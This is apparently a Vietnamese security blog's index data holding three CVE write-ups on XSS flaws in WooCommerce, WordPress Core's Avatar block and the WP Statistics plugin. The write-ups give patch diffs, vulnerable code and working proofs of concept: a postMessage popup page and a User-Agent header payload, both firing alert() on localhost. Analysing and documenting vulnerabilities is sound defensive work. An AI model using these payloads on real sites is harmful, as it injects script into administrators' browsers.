Plugin.","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rPlugin WooCommerce cho WordPress có lỗ hổng Cross-Site Scripting (XSS) dựa trên PostMessage thông qua trang ‘customize-store’ ở tất cả các phiên bản đến và bao gồm 9.4.2, do việc xử lý dữ liệu PostMessage chưa đủ an toàn (không lọc đầu vào và không escape dữ liệu khi xuất ra). Điều này cho phép kẻ tấn công không cần xác thực chèn các đoạn script tùy ý vào trang web, mà sẽ thực thi nếu họ lừa được người dùng thực hiện một hành động, ví dụ như click vào một liên kết. CVE ID: CVE-2025-5062 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 9.3.2 and from 9.4 through 9.4.2 Patched Versions: 9.3.4 and 9.4.3 CVSS severity: Low (6.1) Required Privilege: Unauthenticated Product: WordPress WooCommerce Plugin ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WooCommerce: 9.4.2 (vulnerable) và 9.4.3 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rTrong phiên bản vulnerable, attachParentListeners() lắng nghe tất cả các message từ bất kỳ nguồn nào mà không kiểm tra origin, dữ liệu từ message được gán trực tiếp vào DOM dẫn đến nguy cơ PostMessage-Based XSS (sub-type của DOM-based XSS). export function attachParentListeners() { const listener = ( event ) =\u003e { if ( event.data.type === 'navigate' ) { window.location.href = event.data.url; } }; window.addEventListener( 'message', listener, false ); return () =\u003e { window.removeEventListener( 'message', listener, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.2”} Trong phiên bản patched, mã đã bổ sung nhiều lớp kiểm tra và hạn chế so với phiên bản vulnerable, chuyển từ “chấp nhận mọi message và redirect thẳng” sang “chỉ chấp nhận message đáng tin, xác thực cấu trúc và kiểm tra URL trước khi điều hướng” export function attachParentListeners() { const allowedOrigins = [ getAdminSetting( 'homeUrl' ) ]; function handleMessage( event ) { // Validate the origin. if ( ! allowedOrigins.includes( event.origin ) ) { // Blocked message from untrusted origin: event.origin. return; } // Validate the structure of event.data. if ( ! event.data || typeof event.data.type !== 'string' || typeof event.data.url !== 'string' ) { // Invalid message structure: event.data. return; } // Only allow the 'navigate' type. if ( event.data.type === 'navigate' ) { // Validate the URL format. try { const url = parseAdminUrl( event.data.url ); // Further restrict navigation to trusted domains. if ( ! allowedOrigins.some( ( origin ) =\u003e url.origin === origin ) ) { throw new Error( `Blocked navigation to untrusted URL: ${ url.href }` ); } window.location.href = url.href; } catch ( error ) { // Invalid URL: event.data.url. captureException( error ); } } } window.addEventListener( 'message', handleMessage, false ); return function removeListener() { window.removeEventListener( 'message', handleMessage, false ); }; } {: file=“client/admin/client/customize-store/utils.js v9.4.3”} Diff — So sánh thay đổi mã nguồn giữa phiên bản vulnerable và bản patched ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable code\rTuy đã tìm ra source và sink, nhưng khi phân tích mã nguồn của plugin sau khi upload tôi lại không tìm được hàm attachParentListeners() Kết quả tìm kiếm attachParentListeners() Tôi nghĩ mình đã setup sai nên code không được tải về đầy đủ. Nhưng không, khi tìm với từ khóa \"navigate\" tôi nhận được hàm khác tên có chức năng tương tự attachParentListeners() Kết quả tìm kiếm ’navigate' 👉 Trong bản product, để tối ưu hóa thời gian tải dữ liệu về trình duyệt, plugin đã dùng kỹ thuật minification loại bỏ khoảng trắng, đặt tên hàm, biến ngắn và một phần obfuscation làm cho mã khó đọc hơn. File được tải về có tên 5292.js chứ không phải utils.js. Sau khi làm đẹp code, tôi thấy 5292.js chứa mã của utils.js và nhiều mã từ các file khác. Truy cập trang customize-store và thử gửi postMessage bằng console của trình duyệt http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store Sự kiện alert() khi postMessage từ console browser 👉 alert() được kích hoạt, sử dụng debug trong trình duyệt để xem 5292.js được tải trong trình duyệt 5292.js từ debug của browser ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Sources \u0026 Sinks\rSource: event.data từ window.postMessage (cụ thể event.data.url) Sink: window.location.href = event.data.url ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#sources--sinks"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo trang web với mã nguồn sau: \u003c!DOCTYPE html\u003e \u003chtml lang=\"en\"\u003e \u003chead\u003e \u003cmeta charset=\"UTF-8\"\u003e \u003cmeta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"\u003e \u003ctitle\u003eDocument\u003c/title\u003e \u003c/head\u003e \u003cbody\u003e \u003cbutton id=\"openPopup\"\u003eOpen Popup\u003c/button\u003e \u003cscript\u003e let popup; document.getElementById(\"openPopup\").addEventListener(\"click\", () =\u003e { // Mở popup popup = window.open( \"http://localhost/wp-admin/admin.php?page=wc-admin\u0026path=%2Fcustomize-store\", \"popupWindow\", \"width=400,height=300\" ); // Chờ popup load xong const interval = setInterval(() =\u003e { if (popup \u0026\u0026 !popup.closed) { // Gửi message popup.postMessage({ type: 'navigate', url: 'javascript:alert(\\\"phu0c ph4m\\\")' }, '*'); clearInterval(interval); } }, 5000); }); \u003c/script\u003e \u003c/body\u003e \u003c/html\u003e Admin truy cập trang web và click Open Popup Sau 5s, sự kiện JavaScript được kích hoạt Sự kiện JavaScript từ popup 👉 Đúng với mô tả CVE. Popup không thể tự động kích hoạt nếu không có tương tác của người dùng {: .prompt-info } Ở đây, ta không thể sử dụng \u003ciframe\u003e bởi vì X-Frame-Options: SAMEORIGIN được set trong response =\u003e chỉ khi cùng origin mới nhúng được. X-Frame-Options: SAMEORIGIN được set trong response ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:4:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2025-5062 trong plugin WooCommerce \u003c= 9.4.2 là PostMessage-based DOM XSS. Kẻ tấn công không cần xác thực có thể gửi message độc hại tới trang customize-store, khiến trình duyệt nạn nhân thực thi script. Bản vá 9.4.3 đã kiểm tra origin, xác thực cấu trúc dữ liệu và whitelist URL trước khi redirect. Key takeaways: PostMessage-based DOM XSS có thể thực thi script khi người dùng tương tác (popup/link). Dữ liệu từ postMessage luôn phải coi là không tin cậy. Luôn validate origin, kiểm tra cấu trúc dữ liệu và URL trước khi redirect. Cập nhật plugin lên bản vá mới nhất để ngăn khai thác. ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:5:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress WooCommerce \u003c= 9.3.2 and from 9.4 through 9.4.2 — CVE-2025-5062 ","date":"2025-10-10","objectID":"/vi/posts/2025-10-10-cve-2025-5062/:6:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-5062 Analysis \u0026 POC","uri":"/vi/posts/2025-10-10-cve-2025-5062/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress Core.","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rWordPress Core dễ bị Stored Cross-Site Scripting thông qua tên hiển thị người dùng trong Avatar block ở nhiều phiên bản đến 6.5.2 do insufficient output escaping trên display name. Điều này cho phép authenticated attackers, có quyền contributor-level access trở lên, inject arbitrary web scripts vào các trang — những script này sẽ thực thi mỗi khi người dùng truy cập trang đã bị chèn. Ngoài ra, nó cũng cho phép unauthenticated attackers inject arbitrary web scripts vào những trang có comment block và hiển thị comment author’s avatar. CVE ID: CVE-2024-4439 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: 6.0 - 6.0.7 6.1 - 6.1.5 6.2 - 6.2.4 6.3 - 6.3.3 6.4 - 6.4.3 6.5 - 6.5.1 Patched Versions: 6.0.8 6.1.6 6.2.5 6.3.4 6.4.4 6.5.2 CVSS severity: 7.2 (High) Required Privilege: Contributor+ Product: WordPress ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:1:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Core versions: 6.4.3 (vulnerable) và 6.4.4 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:2:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\r","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rTrong phiên bản vulnerable, WP Core đã sử dụng esc_attr__() để dịch chuỗi và escape HTML attribute trước khi hiển thị ra browser, nhưng đã triễn khai sai cách. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; esc_attr__() sau khi dịch chuỗi và escape HTML thì mới đưa vào sprintf() để chèn biến $author_name =\u003e $author_name không được xử lý. Trong phiên bản patched, $author_name được đưa vào sprintf() trước và sau đó mới được escape HTML bằng esc_attr() =\u003e an toàn trước XSS. $label = 'aria-label=\"' . esc_attr( sprintf( __( '(%s author archive, opens in a new tab)' ), $author_name ) ) . '\"'; So sánh sự thay đổi giữa bản lỗi và bản vá ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable code\rfunction render_block_core_avatar( $attributes, $content, $block ) { // other logic if ( ! isset( $block-\u003econtext['commentId'] ) ) { $author_id = isset( $attributes['userId'] ) ? $attributes['userId'] : get_post_field( 'post_author', $block-\u003econtext['postId'] ); $author_name = get_the_author_meta( 'display_name', $author_id ); // other logic if ( isset( $attributes['isLink'] ) \u0026\u0026 $attributes['isLink'] ) { $label = ''; if ( '_blank' === $attributes['linkTarget'] ) { // translators: %s is the Author name. $label = 'aria-label=\"' . sprintf( esc_attr__( '(%s author archive, opens in a new tab)' ), $author_name ) . '\"'; } } } // other logic } Avatar block là 1 block của Block Editor dùng để tạo nội dung cho post hoặc comment trong WordPress. $author_name là display_name của author có $author_id thuộc về post hiện tại. Nếu đây là post và có link thì $author_name chứa payload sẽ thêm vào attribute aria-label và hiển thị ra trình duyệt. Khi truy cập một post bất kỳ, wp() được gọi là lấy dữ liệu của post đó. Nơi bắt đầu lấy dữ liệu từ post hiện tại function wp( $query_vars = '' ) { global $wp, $wp_query, $wp_the_query; $wp-\u003emain( $query_vars ); if ( ! isset( $wp_the_query ) ) { $wp_the_query = $wp_query; } } Tại đây $wp_query mới được tạo và nó sẽ chứa giá trị của wp_post sau khi query. public function main( $query_args = '' ) { $this-\u003einit(); $parsed = $this-\u003eparse_request( $query_args ); if ( $parsed ) { $this-\u003equery_posts(); $this-\u003ehandle_404(); $this-\u003eregister_globals(); } $this-\u003esend_headers(); do_action_ref_array( 'wp', array( \u0026$this ) ); } main() sẽ parse_request và thực hiện query lấy thông tin post hiện tại bằng query_posts() Lấy thông tin post bằng query_post() $wp_the_query là đối tượng WP_Query chính của WordPress, còn $wp_query chỉ đơn giản là một tham chiếu (reference) trỏ đến $wp_the_query. Vì vậy, khi $wp_the_query đã được khởi tạo và có dữ liệu, thì $wp_query cũng sẽ có cùng giá trị. Giá trị tham chiếu của $wp_query Ta có được giá trị post_content: \u003c!-- wp:avatar {\"userId\":2,\"isLink\":true,\"linkTarget\":\"_blank\"} /--\u003e wp:avatar thuộc loại block core/avatar Hàm render() sẽ gọi đến call_user_func() với callback là render_block_core_avatar() để lấy HTML của Avatar block rồi trả về cho người dùng. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:2","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Sources \u0026 Sinks\rSource: author name của contributor+ Sink: $author_name được chèn vào attribute aria-label ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:3:3","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#sources--sinks"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:4:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rTạo post account với role contributor+ có chứa avatar block, bật tính năng Link to user profile và chọn user contributor. Tạo post với link to user profile được bật Thay đổi firstname chứa XSS payload và chọn display name là firstname Chọn display name chứa XSS payload Admin preview post =\u003e XSS xảy ra XSS xảy ra khi admin truy preview post ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:4:1","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#proof-of-concept-poc"},{"categories":["CVE Analyst"],"collections":null,"content":"Conclusion\rLỗ hổng CVE-2024-4439 trong WordPress Core \u003c= 6.5.1 bắt nguồn từ việc sử dụng sai hàm esc_attr__() khi xử lý display_name trong Avatar block, dẫn đến Stored XSS. Kẻ tấn công có thể lợi dụng lỗ hổng này bằng cách chèn payload vào display_name, khiến script độc hại thực thi khi người dùng (bao gồm admin) truy cập trang chứa block. Bản vá trong 6.0.8, 6.1.6, 6.2.5, 6.3.4, 6.4.4, 6.5.2 đã thay đổi cách xử lý — escape sau khi format chuỗi bằng sprintf() — đảm bảo dữ liệu an toàn trước khi render ra browser. Key takeaways: Thứ tự escape rất quan trọng: dữ liệu cần được format trước, rồi mới escape để tránh lọt XSS. Ngay cả core functions như esc_attr__() nếu dùng sai cách cũng có thể mở ra lỗ hổng nghiêm trọng. Stored XSS đặc biệt nguy hiểm vì nó tồn tại bền trong database và được kích hoạt bất kỳ khi nào người dùng truy cập. Không chỉ plugin/theme, mà WordPress Core cũng cần được update thường xuyên để giảm thiểu rủi ro bảo mật. Việc phân tích patch diff là cách hiệu quả để học cách lập trình an toàn và hiểu rõ nguồn gốc của lỗi. ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:5:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#conclusion"},{"categories":["CVE Analyst"],"collections":null,"content":"References\rCross-site scripting (XSS) cheat sheet — PortSwigger WordPress Core \u003c= effected_version_here — CVE-2024-4439 ","date":"2025-10-09","objectID":"/vi/posts/2025-10-09-cve-2024-4439/:6:0","tags":["analyst","core","xss"],"title":"CVE-2024-4439 Analysis \u0026 POC","uri":"/vi/posts/2025-10-09-cve-2024-4439/#references"},{"categories":["CVE Analyst"],"collections":null,"content":"Security Vulnerability in WordPress WP Statistics Plugin.","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/"},{"categories":["CVE Analyst"],"collections":null,"content":"CVE \u0026 Basic Info\rWP Statistics – The Most Popular Privacy-Friendly Analytics Plugin cho WordPress mắc lỗ hổng Stored Cross-Site Scripting (XSS) qua User-Agent Header trong tất cả các phiên bản từ trước đến 14.5.4 (bao gồm cả 14.5.4). Nguyên nhân xuất phát từ việc kiểm tra và lọc dữ liệu đầu vào cũng như thoát dữ liệu đầu ra chưa đầy đủ. Lỗ hổng này cho phép kẻ tấn công không cần xác thực chèn các đoạn mã JavaScript độc hại vào hệ thống. Các đoạn mã này sẽ được thực thi mỗi khi người dùng truy cập vào trang có chứa dữ liệu đã bị chèn mã độc, gây ra nguy cơ nghiêm trọng cho bảo mật và quyền riêng tư. CVE ID: CVE-2025-9816 Vulnerability Type: Cross Site Scripting (XSS) Affected Versions: \u003c= 14.15.4 Patched Versions: 14.15.5 CVSS severity: Medium (7.1) Required Privilege: Unauthenticated Product: WordPress WP Statistics Plugin ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:1:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#cve--basic-info"},{"categories":["CVE Analyst"],"collections":null,"content":"Requirements\rLocal WordPress \u0026 Debugging: Local WordPress and Debugging. Plugin versions - WP Statistics: v14.15.4 (vulnerable) và v14.15.5 (patched). Diff tool - Meld hoặc bất kỳ công cụ so sánh (diff) nào để kiểm tra và so sánh khác biệt giữa hai phiên bản. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:2:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#requirements"},{"categories":["CVE Analyst"],"collections":null,"content":"Analysis\rTôi đã thiếu sót trong quá trình thu thập thông tin về CVE này, references của https://www.cve.org/CVERecord?id=CVE-2025-9816 chỉ rõ nơi lỗ hỗng xảy ra: includes/admin/templates/pages/devices/models.php{: .filepath} Nhưng tôi đã bỏ qua nó và sử dụng Meld để so sánh code. Do code thay đổi khá nhiều nên tôi đã chủ động tìm các file liên quan đến user-agent Diff — so sánh thay đổi mã giữa bản vulnerable và bản vá Và code thay đổi trong UserAgent.php{: .filepath} làm tôi tin rằng lỗ hỗng thực sự xảy ra ở đây. Diff — Sự thay đổi mã trong UserAgent.php Nó làm tôi tốn khá nhiều thời gian nhưng chưa thể phân tích được. Tuy nhiên, việc này cũng giúp ích cho quá trình phân tích. 🍀 May mắn thay, dưới sự hướng dẫn của các tiền bối, tôi đã focus vào đúng vào vị trí lỗ hổng. Nên quá trình phân tích trở nên dễ dàng hơn. Tip: Đây là lỗ hổng Cross Site Script diễn ra ở trình duyệt của nạn nhân nên ta cần tìm nơi render và trả về HTML. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#analysis"},{"categories":["CVE Analyst"],"collections":null,"content":"Patch diff\rLỗ hổng xảy ra trong file includes/admin/templates/pages/devices/models.php{: .filepath} tại dòng 31. Trong phiên bản vulnerable, $item-\u003emodel được in ra HTML nhưng không có cơ chế bảo vệ nào \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e Trong phiên bản patched, $item-\u003emodel đã được bảo vệ bằng cách đặt nó vào esc_attr() và esc_html(). \u003cspan title=\"\u003c?php echo esc_attr(\\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel)); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : esc_html($item-\u003emodel); ?\u003e \u003c/span\u003e 👉 Bản vá bổ sung lớp lọc đầu vào cho $item-\u003emodel, đảm bảo nó sẽ được escape trước khi in ra HTML. Diff — Sự thay đổi mã trong models.php ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:1","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#patch-diff"},{"categories":["CVE Analyst"],"collections":null,"content":"Vulnerable code\r\u003c?php use WP_STATISTICS\\Helper; ?\u003e \u003cdiv class=\"postbox-container wps-postbox-full\"\u003e \u003c?php if (!empty($data['visitors'])) : ?\u003e \u003cdiv class=\"o-table-wrapper\"\u003e \u003ctable width=\"100%\" class=\"o-table wps-new-table\"\u003e \u003cthead\u003e \u003c/thead\u003e \u003ctbody\u003e \u003c?php foreach ($data['visitors'] as $item) : ?\u003e \u003ctr\u003e \u003ctd class=\"wps-pd-l\"\u003e \u003cspan title=\"\u003c?php echo \\WP_STATISTICS\\Admin_Template::unknownToNotSet($item-\u003emodel); ?\u003e\" class=\"wps-model-name\"\u003e \u003c?php echo self::isUnknown($item-\u003emodel) ? esc_html__('Unknown', 'wp-statistics') : $item-\u003emodel; ?\u003e \u003c/span\u003e \u003c/td\u003e \u003c/tr\u003e \u003c?php endforeach; ?\u003e \u003c/tbody\u003e \u003c/table\u003e \u003c/div\u003e \u003c?php else : ?\u003e \u003cdiv class=\"o-wrap o-wrap--no-data wps-center\"\u003e \u003c?php esc_html_e('No recent data available.', 'wp-statistics'); ?\u003e \u003c/div\u003e \u003c?php endif; ?\u003e \u003c/div\u003e Nếu $data không rỗng thì duyệt qua $data và hiển thị dữ liệu đã thống kê của visitors, bao gồm model. Nếu rỗng thì in ra No recent data available. public static function isUnknown($value) { if (empty($value) or $value == 'Unknown' or $value == __(\"Unknown\", 'wp-statistics')) { return true; } return false; } public static function unknownToNotSet($value) { if (self::isUnknown($value)) { return __('(not set)', 'wp-statistics'); } return $value; } unknownToNotSet() sẽ trả về (not set) nếu $item-\u003emodel rỗng, Unknown, Unknown theo từng ngôn ngữ. __(\"Unknown\", 'wp-statistics') sẽ tìm bản dịch của Unknown trong file dịch .po/.mo của text domain wp-statistics 👉 Không có cơ chế bảo vệ $item-\u003emodel $data không được khởi tạo trong file này nên chắc chắn rắng nó được khởi tạo từ nơi khác và models.php{: .filepath} sẽ sử dụng nó khi được include. Ta có thể search bằng từ khóa models.php để tìm đến nơi gọi đến nó, nhưng ở đây nó được include động. Thay vào đó, ta search với tên thư mục chứa nó pages/devices. Diff — Cách các template được gọi động 👉 models.php{: .filepath} sẽ được gọi động trong hàm render() của class TabsView class TabsView extends BaseTabView { public function render() { $currentTab = $this-\u003egetCurrentTab(); $data = $this-\u003egetTabData(); $args = [ 'title' =\u003e esc_html__('Devices', 'wp-statistics'), 'pageName' =\u003e Menus::get_page_slug('devices'), 'paged' =\u003e Admin_Template::getCurrentPaged(), 'custom_get' =\u003e ['tab' =\u003e $currentTab], 'data' =\u003e $data, 'viewMoreUrlArgs' =\u003e ['type' =\u003e 'single-' . rtrim($currentTab, 's'), 'from' =\u003e Request::get('from'), 'to' =\u003e Request::get('to')], 'tabs' =\u003e [ [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'overview']), 'title' =\u003e esc_html__('Overview', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'browsers']), 'title' =\u003e esc_html__('Browsers', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'platforms']), 'title' =\u003e esc_html__('Operating Systems', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'models']), 'title' =\u003e esc_html__('Device Models', 'wp-statistics'), ], [ 'link' =\u003e Menus::admin_url('devices', ['tab' =\u003e 'categories']), 'title' =\u003e esc_html__('Device Categories', 'wp-statistics'), ] ], ]; Admin_Template::get_template(['layout/header', 'layout/tabbed-page-header', \"pages/devices/$currentTab\", 'layout/postbox.hide', 'layout/footer'], $args); } } Có sự tương quan giữa các giá trị trong $args và submenu Devices Diff — Sự tương quan giữa các giá trị trong $args và submenu Devices Giá trị tab trong args sẽ tương ứng với param tab trên URL =\u003e Phạm vi truy vết nằm trong submenu Devices của admin panel. Ta cần xác định $currentTab để biết cách render() gọi đến models.php{: .filepath} và $data để inject payload. Biến $currentTab // $currentTab = $this-\u003egetCurrentTab(); protected function getCurrentTab() { return Request::get('tab', $this-\u003edefaultTab); } getCurrentTab() trả về giá trị của Request::get() // $param='tab' public static function get($param, $default = false, $return = 'string') { if (empty($_REQUEST[$param])) return $default; $value = $_REQUEST[$param]; if ($return === 'string') { return sanitize_text_field($value); } if ($return === 'url') { return sanitize_url($v","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:2","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#vulnerable-code"},{"categories":["CVE Analyst"],"collections":null,"content":"Sources \u0026 Sinks\rSource: User-Agent header (POST /wp-json/wp-statistics/v2/hit) — DeviceDetector parse → getModel(). Sink: includes/admin/templates/pages/devices/models.php — echo $item-\u003emodel (không esc_html() / esc_attr()) ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:3","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#sources--sinks"},{"categories":["CVE Analyst"],"collections":null,"content":"Flow\rAttacker gửi UA chứa payload XSS trong model Model chứa payload được lưu trong database Admin mở tab models =\u003e payload chạy. ","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:3:4","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#flow"},{"categories":["CVE Analyst"],"collections":null,"content":"Exploit\r","date":"2025-10-08","objectID":"/vi/posts/2025-10-08-cve-2025-9816/:4:0","tags":["analyst","plugin","xss"],"title":"CVE-2025-9816 Analysis \u0026 POC","uri":"/vi/posts/2025-10-08-cve-2025-9816/#exploit"},{"categories":["CVE Analyst"],"collections":null,"content":"Proof of Concept (PoC)\rGửi request chứa XSS payload: POST /wp-json/wp-statistics/v2/hit HTTP/1.1 Host: localhost User-Agent: Mozilla/5.0 (Linux; Android 14; Goly \"onmouseover=alert()-\" Build) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.0.0 Mobile Safari/537.36 wp_statistics_hit=1\u0026source_type=home\u0026source_id=0\u0026search_query=\u0026signature=787b07b8979cb982ec89a4f103a68081\u0026endpoint=hit\u0026referred=\u0026page_uri=Lw%3D%3D Admin truy cập endpoint và hover vào model chứa payload: http://localhost/wp-admin/admin.php?page=wps_devices_page\u0026tab=models Result — PoC execution screenshot Dùng \" để đóng title, tạo alert() thông qua sự kiện onmouseover vì đây là thẻ \u003cspan\u003e, - đùng để nối chuỗi trong JavaScript tránh được lỗi cú pháp 